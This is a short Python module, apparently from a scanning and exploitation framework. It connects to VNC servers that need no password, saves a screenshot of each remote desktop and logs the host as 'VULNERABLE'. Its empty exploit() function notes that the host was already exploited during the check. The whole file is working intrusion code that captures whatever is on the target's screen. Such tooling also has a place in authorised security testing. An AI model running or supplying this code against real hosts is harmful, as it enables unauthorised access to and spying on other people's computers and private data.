# modules/grab_screen.py

from vncdotool import api
import os
from core.log import log_result

def check(ip, port):
    try:
        client = api.connect(f"{ip}::{port}", password=None, timeout=3)
        output_dir = "output/screens"
        os.makedirs(output_dir, exist_ok=True)

        screenshot_path = os.path.join(output_dir, f"{ip}_{port}.png")
        client.captureScreen(screenshot_path)
        print(f"      [+] Screenshot saved: {screenshot_path}")

        log_result(
            ip=ip,
            port=port,
            service="VNC",
            banner="RFB (unauth)",
            module=__name__,
            status="VULNERABLE",
            details=f"Screenshot saved: {screenshot_path}"
        )

        return True

    except Exception as e:
        print(f"      [-] Screenshot failed: {e}")
        log_result(ip, port, "VNC", "RFB (unauth)", __name__, "FAILED", str(e))
        return False

def exploit(ip, port):
    # Nothing extra; already exploited in check()
    pass
